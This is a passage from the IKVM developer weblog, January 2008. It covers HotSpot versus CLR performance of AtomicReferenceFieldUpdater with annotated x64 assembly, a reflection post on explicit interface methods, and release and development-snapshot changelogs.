&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 (<font color="#0000FF">object</font>)update, (<font color="#0000FF">object</font>)expect);<br>
 &nbsp;&nbsp;&nbsp;
 }<br>
 &nbsp;&nbsp;&nbsp; <font color="#008000">// ...other methods omitted...</font><br>
 &nbsp;
 }<br>
 <br>
 &nbsp; <font color="#0000FF">static</font> <font color="#0000FF">void</font> 
 main(<font color="#0000FF">string</font>[] args)
 {<br>
 &nbsp;&nbsp;&nbsp; <font color="#2B91AF">AtomicReferenceFieldUpdater</font> udp =
 <font color="#0000FF">new</font>
 <font color="#2B91AF">__ARFU_fieldLjava/lang/Object;</font>();<br>
 &nbsp;&nbsp;&nbsp; <font color="#008000">// ...rest of method omitted...</font><br>
 &nbsp;
 }<br>
 }</code></p>
 <p>The bytecode compiler only does this optimization if the arguments to<code>
 <a href="http://java.sun.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicReferenceFieldUpdater.html#newUpdater(java.lang.Class, java.lang.Class, java.lang.String)">
 newUpdater</a></code> are constants and match up with a volatile instance 
 reference field in the current class.</p><p>The reason this optimization 
 only first showed up in IKVM 0.37 is that it requires the generic version of
 <code><a href="http://msdn2.microsoft.com/en-us/library/bb297966.aspx">
 Interlocked.CompareExchange</a></code>. In this particular example the 
 non-generic version would have worked, but in the real world nearly all uses 
 of AtomicReferenceFieldUpdater are on fields that have a more specific type 
 than Object.</p>
 <p><b>The Assembly</b></p>
 <p>So why is HotSpot twice as fast? I modified the test slightly to make the 
 generated assembly code easier to read by making it an infinite loop. Here's 
 the x64 code for the loop:</p>
 <p><code>00000000028C2690&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,qword ptr [r8+10h] <br>
 00000000028C2694&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,1026DD08h <br>
 00000000028C269E&nbsp;&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10 <br>
 00000000028C26A1&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C2773 <br>
 00000000028C26A7&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [r8+20h] <br>
 00000000028C26AB&nbsp;&nbsp; test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r10 <br>
 00000000028C26AE&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C273B <br>
 00000000028C26B4&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [r8+28h] <br>
 00000000028C26B8&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r9 <br>
 00000000028C26BB&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10 <br>
 00000000028C26BE&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax <br>
 00000000028C26C0&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10d,r10d <br>
 00000000028C26C3&nbsp;&nbsp; lock cmpxchg qword ptr [r11],r10 <br>
 00000000028C26C8&nbsp;&nbsp; sete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r12b <br>
 00000000028C26CC&nbsp;&nbsp; movzx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r12d,r12b <br>
 00000000028C26D0&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r11 <br>
 00000000028C26D3&nbsp;&nbsp; shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,9 <br>
 00000000028C26D7&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,589FF80h <br>
 00000000028C26E1&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte ptr [r11+r10],0 <br>
 00000000028C26E6&nbsp;&nbsp; test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [160000h],eax <br>
 00000000028C26EC&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C2690</code></p>
 <p>HotSpot did it's thing and was able to inline the virtual compareAndSet 
 method. I'm pretty sure that HotSpot doesn't have special support 
 for AtomicReferenceFieldUpdater, but this is simply the normal HotSpot 
 devirtualization optimization at work. The <code>lock cmpxchg</code> instruction is the 
 result of HotSpot having intrinsic support for 
 <code>sun.misc.Unsafe.compareAndSwapObject</code>.</p>
 <p>Let's go over the assembly instructions in detail:</p>
 <p><code>00000000028C2690&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,qword ptr [r8+10h] <br>
 00000000028C2694&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,1026DD08h <br>
 00000000028C269E&nbsp;&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10 <br>
 00000000028C26A1&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C2773</code></p><p>
 This looks like a HotSpot virtual method inline guard. It's checking to make 
 sure that the object is of the expected type (if it isn't, the inlined 
 virtual method may not be correct anymore).</p>
 <p><code>00000000028C26A7&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [r8+20h] <br>
 00000000028C26AB&nbsp;&nbsp; test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r10 <br>
 00000000028C26AE&nbsp;&nbsp; jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C273B </code></p>
 <p>I'm not sure. Some field in the AtomicReferenceFieldUpdater object is tested for null.</p>
 <p><code>00000000028C26B4&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,qword ptr [r8+28h]</code></p>
 <p>The offset to the field is loaded from the AtomicReferenceFieldUpdater 
 object.</p>
 <p><code>00000000028C26B8&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r9 </code></p>
 <p>The passed in object reference is moved from <code>r9</code> to <code>r11</code>.</p>
 <p><code>00000000028C26BB&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,r10</code></p>
 <p>Add the field offset to the object reference. We now have the address of 
 the memory location we want to update in <code>r11</code>.</p>
 <p><code>00000000028C26BE&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax</code></p>
 <p>Clear <code>rax</code> to represent the passed in <code>null</code> value of the <code>expect</code> argument. 
 I'm not sure why the disassembler shows the register as <code>eax</code>, but this 
 instruction clears the full 64 bit <code>rax</code> register.</p>
 <p><code>00000000028C26C0&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10d,r10d</code></p>
 <p><code>r10</code> is cleared and represents the passed in <code>null</code> value of the 
 <code>update</code> argument.</p>
 <p><code>00000000028C26C3&nbsp;&nbsp; lock cmpxchg qword ptr [r11],r10</code></p>
 <p>The actual interlocked compare and exchange instruction. The qword at 
 memory location <code>r11</code> is compared with <code>rax</code> and if it matches <code>r10</code> is written to 
 it. Since I'm on a dual core machine, the <code>lock</code> prefix is applied. 
 Locking the bus is expensive, so HotSpot omits it when running on a single 
 core machine.</p>
 <p><code>00000000028C26C8&nbsp;&nbsp; sete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r12b <br>
 00000000028C26CC&nbsp;&nbsp; movzx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r12d,r12b</code></p>
 <p>The <code>cmpxchg</code> instruction sets the zero flag if it was successful. These 
 two instruction copy the zero flag into the <code>r12</code> register (it is set to 0 or 
 255 to represent either false or true). Since the result isn't actually used 
 in this case, this could have been optimized away.</p>
 <p><code>00000000028C26D0&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,r11 <br>
 00000000028C26D3&nbsp;&nbsp; shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r10,9 <br>
 00000000028C26D7&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r11,589FF80h <br>
 00000000028C26E1&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte ptr [r11+r10],0</code></p>
 <p>This is a little interesting. It takes the address of the field that was 
 just (potentially) updated and shifts it to the right by 9 bits and uses 
 that value to index a static table and clear the corresponding byte. This is 
 a GC write barrier. The GC consults the table (known as a card table) to 
 know what objects in older generations it needs to scan when doing a GC of a 
 younger generation.</p>
 <p><code>00000000028C26E6&nbsp;&nbsp; test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dword ptr [160000h],eax </code></p>
 <p>This seemingly useless test is part of a mechanism used by the VM to 
 suspend the thread at this instruction (a safepoint). When the VM 
 wants to suspend all threads (for a GC) it unmaps the safepoint polling 
 memory page (in this case at 0x160000) and waits for all threads to suspend. 
 Each thread running compiled Java code will eventually run this instruction 
 and cause a page fault, inside the page fault handler it is detected that a 
 safepoint thread suspend is requested and the thread calls the VM to suspend 
 itself.</p>
 <p><code>00000000028C26EC&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00000000028C2690</code></p>
 <p>Branch to the top and start over again.</p>
 <p><b>The Conclusion</b></p>
 <p>The .NET Framework JIT doesn't inline virtual methods and 
 <code>Interlocked.CompareExchange</code> is not a JIT instrisic, so there 
 the story is pretty straightforward. Each loop iteration calls 
 <code>Interlocked.CompareExchange</code> which in turn calls the GC write 
 barrier function. This is why HotSpot is able to beat IKVM 0.37 by a factor 
 of two.</p>
 <p>Of course, when you're coding in C# you can write the microbenchmark to 
 call <code>Interlocked.CompareExchange</code> directly:</p>
 <p><code><font color="#0000FF">using</font> System;<br>
 <font color="#0000FF">using</font> System.Threading;<br>
 <br>
 <font color="#0000FF">class</font> <font color="#2B91AF">Test</font>
 {<br>
 &nbsp; <font color="#0000FF">volatile</font> <font color="#0000FF">object</font> field;<br>
 <br>
 &nbsp; <font color="#0000FF">static</font> <font color="#0000FF">void</font> Main(<font color="#0000FF">string</font>[] args)
 {<br>
 &nbsp;&nbsp;&nbsp; <font color="#2B91AF">Test</font> obj = <font color="#0000FF">new</font> <font color="#2B91AF">Test</font>();<br>
 &nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> 
 j = 0; j &lt; 5; j++)
 {<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> start = 
 <font color="#2B91AF">Environment</font>.TickCount;<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> i = 0; i &lt; 10000000; i++)<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Interlocked</font>.CompareExchange(<font color="#0000FF">ref</font> obj.field, 
 <font color="#0000FF">null</font>, <font color="#0000FF">null</font>);<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> end = 
 <font color="#2B91AF">Environment</font>.TickCount;<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Console</font>.WriteLine(end - start);<br>
 &nbsp;&nbsp;&nbsp;
 }<br>
 &nbsp;
 }<br>
 }</code></p>
 <p>This runs in 265 milliseconds which goes to show that in this case all 
 the fancy footwork that HotSpot does can almost be matched simply by having
 <i>by ref</i> argument passing in your language. Of course, the CLR JIT 
 isn't perfect. When you change the field type to <code>string</code> the running time 
 increases to 436 milliseconds because the invocation of a generic method 
 goes through a stub that makes sure that the method instantiation exists. 
 Here it would probably pay to to teach the JIT about the 
 generic methods 
 in <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.threading.interlocked_methods.aspx">
 System.Threading.Interlocked</a></code>.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/31/2008 10:50:35 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5402bb0a-5f05-4939-9d13-fd42166155b6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5402bb0a-5f05-4939-9d13-fd42166155b6">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 January 2008</h2></div>
<div class="newsItems"><a name="ae120bcd9-dca0-49d3-be18-e511bf4f9175"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Release Candidate 2</h3>
	<div class="entryBody">
		<P>One more bug fix.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Changed version to 0.36.0.7. </LI>
<LI>Fix bug in DynamicMethod based serialization for fields typed as ghost interfaces.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.7.zip">ikvmbin-0.36.0.7.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.7.zip">ikvm-0.36.0.7.zip</A></P>
<P>The external sources are the same as the <A HREF="/PermaLink.aspx?guid=44e1730b-35a8-4c50-a19e-d96c4ef13a85">previous rc</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/25/2008 07:38:42 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e120bcd9-dca0-49d3-be18-e511bf4f9175"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e120bcd9-dca0-49d3-be18-e511bf4f9175">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 23 January 2008</h2></div>
<div class="newsItems"><a name="a7356a87f-e5d7-4723-ae49-b263ab9e40ae"></a><div class="entry">
	<h3 class="entryTitle">How To Get an Explicit Interface Implementation Method</h3>
	<div class="entryBody">
		<p>Suppose you have a <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.type.aspx">Type</a></code> that you know implements 
 <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.collections.ienumerable.aspx">IEnumerable</a></code>, how do you get the <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.collections.ienumerable.getenumerator.aspx">GetEnumerator</a></code> method?</p>
 <p>Both the developer(s) at Microsoft and the Mono developer(s) that wrote 
 <code>System.Xml.Serialization</code> managed to find the same wrong answer to this question. Here's the 
 <a href="http://anonsvn.mono-project.com/viewcvs/trunk/mcs/class/System.XML/System.Xml.Serialization/TypeData.cs?rev=76099&view=markup">code from Mono</a>, but Microsoft does somethig very similar:</p>
 <p><code><font color="#2B91AF">MethodInfo</font> met = type.GetMethod (<font color="#7D3302">&quot;GetEnumerator&quot;</font>,
 <font color="#2B91AF">Type</font>.EmptyTypes);<br>
 <font color="#0000FF">if</font> (met == <font color="#0000FF">null</font>) { <br>
 &nbsp; <font color="#008000">// get private implemenation</font><br>
 &nbsp;
 met = type.GetMethod (<font color="#7D3302">&quot;System.Collections.IEnumerable.GetEnumerator&quot;</font>,<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 <font color="#2B91AF">BindingFlags</font>.NonPublic | <font color="#2B91AF">BindingFlags</font>.Public 
 | 
 <font color="#2B91AF">BindingFlags</font>.Instance,<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 <font color="#0000FF">null</font>, <font color="#2B91AF">Type</font>.EmptyTypes, 
 <font color="#0000FF">null</font>);<br>
 }</code></p>
 <p>The reason this is wrong is that the name of the private method is an implementation detail of the compiler that was used to compile the code. C# happens to name the private method this way, but other languages may not.</p>
 <p>For example, try the following VB webservice:</p>
 <p><code><span style="background-color: #FFFF00">&lt;%</span><font color="#0000FF">@</font>
 <font color="#A31515">WebService</font> <font color="#ff0000">Language</font><font color="#0000FF">=&quot;VB&quot;</font>
 <font color="#ff0000">Class</font><font color="#0000FF">=&quot;Service1&quot;</font>
 <span style="background-color: #FFFF00">%&gt;</span><br>
 <br>
 <font color="#0000FF">Imports</font> System.Collections<br>
 <font color="#0000FF">Imports</font> System.Web.Services<br>
 <br>
 <font color="#0000FF">Public Class</font> Service1<br>
 &nbsp;
 <font color="#0000FF">Inherits</font> WebService<br>
 <br>
 &nbsp;
 &lt;WebMethod()&gt; <font color="#0000FF">Public</font>
 <font color="#0000FF">Function</font> HelloWorld() <font color="#0000FF">As</font> Frob<br>
 &nbsp;&nbsp;&nbsp;
 <font color="#0000FF">Return</font> <font color="#0000FF">New</font> Frob()<br>
 &nbsp;
 <font color="#0000FF">End</font> <font color="#0000FF">Function</font><br>
 <font color="#0000FF">End</font> <font color="#0000FF">Class</font><br>
 <br>
 <font color="#0000FF">Public</font> <font color="#0000FF">Class</font> Frob<br>
 &nbsp;
 <font color="#0000FF">Implements</font> IEnumerable<br>
 <br>
&nbsp; <font color="#008000">' Note that this method is private</font><br>
 &nbsp;
 <font color="#0000FF">Private</font> <font color="#0000FF">Function</font> GetEnumerator() 
 <font color="#0000FF">As</font> IEnumerator 
 <font color="#0000FF">Implements</font> IEnumerable.GetEnumerator<br>
 &nbsp;&nbsp;&nbsp;
 <font color="#0000FF">Return</font> <font color="#A31515">&quot;frob&quot;</font>.GetEnumerator()<br>
 &nbsp;
 <font color="#0000FF">End</font> <font color="#0000FF">Function</font><br>
 <br>
 &nbsp;
 <font color="#0000FF">Public</font> <font color="#0000FF">Sub</font> Add(<font color="#0000FF">ByVal</font> obj 
 <font color="#0000FF">As</font> Object)<br>
 &nbsp;&nbsp;&nbsp;
 <font color="#0000FF">Throw</font> <font color="#0000FF">New</font> NotSupportedException()<br>
 &nbsp;
 <font color="#0000FF">End</font> <font color="#0000FF">Sub</font><br>
 <font color="#0000FF">End</font> <font color="#0000FF">Class</font></code></p><p>If you run this webservice on .NET, you'll an exception inside <code>System.Xml.Serialization.TypeScope.GetTypeDesc()</code>, because it expects to find a public <code>GetEnumerator</code> method or a private 
 <code>System.Collections.IEnumerable.GetEnumerator</code> method. However, VB allows you to pick the method name (in this case simply <code>GetEnumerator</code>). If you make the <code>GetEnumerator</code> method public, the webservice will work.</p>
 <p><b>The Right Way</b></p>
 <p>Here's the right way to get the method:</p>
 <p><code><font color="#2B91AF">MethodInfo</font> getEnumerator = 
 <font color="#0000FF">typeof</font>(<font color="#2B91AF">IEnumerable</font>).GetMethod(<font color="#A31515">&quot;GetEnumerator&quot;</font>,
 <font color="#2B91AF">Type</font>.EmptyTypes);<br>
 <font color="#2B91AF">InterfaceMapping</font> map = type.GetInterfaceMap(<font color="#0000FF">typeof</font>(<font color="#2B91AF">IEnumerable</font>));<br>
 <font color="#0000FF">int</font> index = <font color="#2B91AF">Array</font>.IndexOf(map.InterfaceMethods, getEnumerator);<br>
 <font color="#2B91AF">MethodInfo</font> meth = map.TargetMethods[index];</code></p>
 <p><b>Meta Question</b></p>
 <p>Of course, the real question remains unanswered. Why do we need the 
 <code>MethodInfo</code> in the first place? Wouldn't Xml serialization be better 
 off by simply using the 
 <code>IEnumerable</code> interface?</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/23/2008 07:37:35 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7356a87f-e5d7-4723-ae49-b263ab9e40ae"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7356a87f-e5d7-4723-ae49-b263ab9e40ae">Comments [8]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 January 2008</h2></div>
<div class="newsItems"><a name="a44e1730b-35a8-4c50-a19e-d96c4ef13a85"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Update 1 Release Candidate 1</h3>
	<div class="entryBody">
		<P>As I've said when I released 0.36, this is a version that will be maintained for a while because it is the last version to support .NET 1.1. This means that I will strive to release updates relatively soon after bugs are reported (in the supported areas). This is the first of such update releases.</P>
<P><B>Changes</B>:</P>
<UL>
<LI>Changed version to 0.36.0.6.</LI>
<LI>Fix for reflection bug on .NET generic nested types that caused <A href="http://sourceforge.net/mailarchive/message.php?msg_name=477171a5.1ec37e0a.1f81.7bc8@mx.google.com">this</A>.</LI>
<LI>Fix for bug <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1865922&amp;group_id=69637&amp;atid=525264">#1865922</A>.</LI>
<LI>java.awt.image.Raster <A href="http://developer.classpath.org/pipermail/classpath-patches/2008-January/005745.html">fix</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.36.0.6.zip">ikvmbin-0.36.0.6.zip</A><BR>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.5.zip">ikvm-0.36.0.6.zip</A></P>
<P>The external sources are the same as the ones with the <A href="http://sourceforge.net/project/showfiles.php?group_id=69637&amp;package_id=68631&amp;release_id=560540">first 0.36 release</A> + java.awt.image.Raster patch referenced above.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/14/2008 06:27:59 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=44e1730b-35a8-4c50-a19e-d96c4ef13a85"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=44e1730b-35a8-4c50-a19e-d96c4ef13a85">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 07 January 2008</h2></div>
<div class="newsItems"><a name="a15ad7222-7805-49f0-8e19-e6ac62403fac"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>The major change is that I dropped support for .NET 1.1 and started taking advantage of .NET 2.0 specific features. The most significant result of that is that it is now possible to run (some) applications in partial trust and that IKVM.OpenJDK.ClassLibrary.dll and IKVM.Runtime.dll can be put into the GAC and called from partially trusted code. Note that if you want to put the binaries in the GAC you'll have to build your own binaries (to get them strong named) as the development snapshot binaries are not strong named.</P>
<P><B>Changes</B>:</P>
<UL>
<LI>.NET 1.1 is no longer supported.</LI>
<LI>Removed .NET 2.0 warnings (except for the "unreachable code" ones).</LI>
<LI>Removed most .NET 1.1 specific code.</LI>
<LI>Removed conditional compilation of .NET 2.0 specific code.</LI>
<LI>Updated FileChannelImpl to use SafeFileHandle and GC.Add|RemoveMemoryPressure.</LI>
<LI>Added GC.KeepAlive to "native" methods of MappedByteBuffer.</LI>
<LI>Improved VFS.</LI>
<LI>The VFS file "lib/security/cacerts" is now dynamically generated from the .NET X509 store.</LI>
<LI>Implemented native methods of java.io.Console (some Win32 only).</LI>
<LI>Implemented support for InternalsVisibleToAttribute.</LI>
<LI>Moved JNI implementation into a separate assembly (IKVM.Runtime.JNI.dll) to make IKVM.Runtime.dll verifiable.</LI>
<LI>Made all "native" method classes internal.</LI>
<LI>Restructured VM &lt;-&gt; Library interface to take advantage of InternalsVisibleTo to remove public methods and reflection usage.</LI>
<LI>Added support for adding constructors in map.xml.</LI>
<LI>Changed &lt;clinit&gt; method to SmartConstructorMethodWrapper to support calling it from map.xml</LI>
<LI>Removed call to unnecessary call to MatchTypes (to support partial trust)</LI>
<LI>Ignore SecurityException in CanonicalizePath.</LI>
<LI>Moved some calls to methods with a LinkDemand (that fails in partial trust) to a separate methods.</LI>
<LI>Added stuff to map.xml to remove the need for reflection in VM / Library bootstrap.</LI>
<LI>Inverted IKVM.Runtime.JNI dependency in stack walking code to avoid needlessly loading the JNI assembly.</LI>
<LI>Fixed bug that caused nested .NET generic types to report a declaring type.</LI>
<LI>Added -skiperror option to ikvmstub (by Kevin Grigorenko).</LI>
<LI>Replaced GCHandle in java.lang.ref.Reference with WeakReference to support partial trust.</LI>
<LI>Added check to prevent sun.misc.Unsafe.objectFieldOffset() from working on static fields.</LI>
<LI>Added support for registering a delegate with a DynamicTypeWrapper that gets called after the type is baked.</LI>
<LI>Intrinsified AtomicReferenceFieldUpdater.newUpdater().</LI>
<LI>Added virtual opcode to explicitly trigger class initialization from map.xml.</LI>
<LI>Added accessor methods for "slot" to Method &amp; Constructor.</LI>
<LI>Implemented System.setIn0, setOut0, setErr0 in map.xml.</LI>
<LI>Hacked sun.misc.SharedSecrets in map.xml to replace Unsafe.ensureClassInitialize() with direct calls.</LI>
<LI>Replaced java.nio.Bits.byteOrder() in map.xml with simple System.BitConver.IsLittleEndian based implementation.</LI>
<LI>Disabled DynamicMethodSupport when running in partial trust.</LI>
<LI>Don't trigger load of JNI assembly when "loading" a fake system library.</LI>
<LI>Added ikvmc -platform option.</LI>
<LI>Added SecurityCritical and AllowPartiallyTrustedCallers annotation to IKVM.OpenJDK.ClassLibrary.dll.</LI>
<LI>Added SecurityCritical and AllowPartiallyTrustedCallers attributes to IKVM.Runtime.dll.</LI></UL>
<P><B>WARNING</B>: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</P>
<P>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.2928.zip">ikvmbin-0.37.2928.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/07/2008 08:56:57 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=15ad7222-7805-49f0-8e19-e6ac62403fac"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=15ad7222-7805-49f0-8e19-e6ac62403fac">Comments [4]</a>
		
		<br clear="all">
	</div>
